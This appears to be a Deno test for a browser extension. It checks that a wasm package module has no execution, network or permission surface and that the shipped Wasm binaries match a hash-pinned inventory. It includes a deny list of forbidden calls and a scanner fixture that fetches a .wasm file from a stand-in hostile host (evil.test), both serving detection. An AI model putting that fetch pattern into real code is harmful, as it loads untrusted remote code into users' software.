// tests/wasm-package-authority-static.test.ts — chrome-agent-platform-uvo3.
//
// The STATIC half of tests/wasm-package-authority.test.ts, split out by the existing remedy for a mixed
// file (tests/quiet-window-static.test.ts, tests/chrome-profile-static.test.ts, and p1lp's
// tests/chrome-tools-t12-static.test.ts): that file walks extension/ for the shipped .wasm set while its
// other fifteen tests are manifest and schema policy unit tests over fixtures, so promoting it whole
// would run those fifteen in every subset gate for one cross-cutting invariant.
//
// It reads tracked source as DATA and has no import edge to what it inspects — exactly the shape a
// subset gate cannot see — so it is registered in SOURCE_INSPECTING_GUARDS (part of ALWAYS_ON) in
// scripts/select-tests.mjs. Static file reads and 25 CAS binary hashes: no browser, no spawn, no build
// precondition (it skips extension/dist). Do not fold it back into the original file, and do not
// promote that file whole.
// @ts-nocheck
import { fileURLToPath } from "node:url";
import { assert, assertEquals } from "jsr:@std/assert@1";
import { scanShippedJs } from "../scripts/scan-shipped.mjs";

const hex = (bytes) => [...bytes].map((byte) => byte.toString(16).padStart(2, "0")).join("");

Deno.test("wasm static/RHC boundary: no route, execution, owner, OPFS, network or permission surface", async () => {
  const source = await Deno.readTextFile(new URL("../extension/lib/wasm-package-authority.js", import.meta.url));
  for (const forbidden of ["WebAssembly.", "new Worker", "navigator.storage", "chrome.permissions", "addListener(", "fetch(", "createAsset", "OpfsToolWorkspace"]) {
    assert(!source.includes(forbidden), `forbidden authority surface: ${forbidden}`);
  }
  const serviceWorker = await Deno.readTextFile(new URL("../extension/background/service-worker.js", import.meta.url));
  assert(!serviceWorker.includes("wasm-package-authority"));
  const wasmFiles = [];
  const walk = async (dir) => {
    for await (const entry of Deno.readDir(dir)) {
      const path = `${dir}/${entry.name}`;
      if (entry.isDirectory && !new Set(["dist", "dist-versions", "dist-archives"]).has(entry.name)) await walk(path);
      else if (entry.isFile && entry.name.endsWith(".wasm")) wasmFiles.push(path);
    }
  };
  await walk(fileURLToPath(new URL("../extension", import.meta.url)));
  // Since 0.2.157 the bundled lane PHYSICALLY SHIPS the 25 reviewed binaries
  // (inventory-only; still no route/execution). The successor invariant: the
  // shipped set is EXACTLY the inventory's declared CAS set — no more, no
  // less — and every byte hashes to its pinned content address.
  const { BUNDLED_INVENTORY } = await import("../extension/lib/bundled-inventory-data.js");
  const declaredCas = BUNDLED_INVENTORY.files
    .filter((row) => row.rel.startsWith("extension/wasm/cas/"))
    .map((row) => fileURLToPath(new URL(`../${row.rel}`, import.meta.url)))
    .sort();
  assertEquals([...wasmFiles].sort(), declaredCas, "shipped Wasm must be exactly the inventory CAS set");
  for (const row of BUNDLED_INVENTORY.files.filter((f) => f.rel.startsWith("extension/wasm/cas/"))) {
    const bytes = await Deno.readFile(new URL(`../${row.rel}`, import.meta.url));
    assertEquals(bytes.byteLength, row.size, row.rel);
    assertEquals(hex(new Uint8Array(await crypto.subtle.digest("SHA-256", bytes))), row.sha256, row.rel);
  }
  const memory = await Deno.readTextFile(new URL("../extension/lib/memory.js", import.meta.url));
  for (const key of ["wasmPkg", "wasmPkgRepair", "__wasmTx"]) assert(memory.includes(key), `reserved key absent: ${key}`);
  const dynamic = await scanShippedJs(["dynamic.js"], { readText: async () => "export const x=WebAssembly.compile(new Uint8Array());" });
  assert(dynamic.some((row) => row.includes("dynamic WebAssembly")));
  const fetched = await scanShippedJs(["fetch.js"], { readText: async () => 'fetch("https://evil.test/x.wasm")' });
  assert(fetched.some((row) => row.includes("network Wasm")));
});
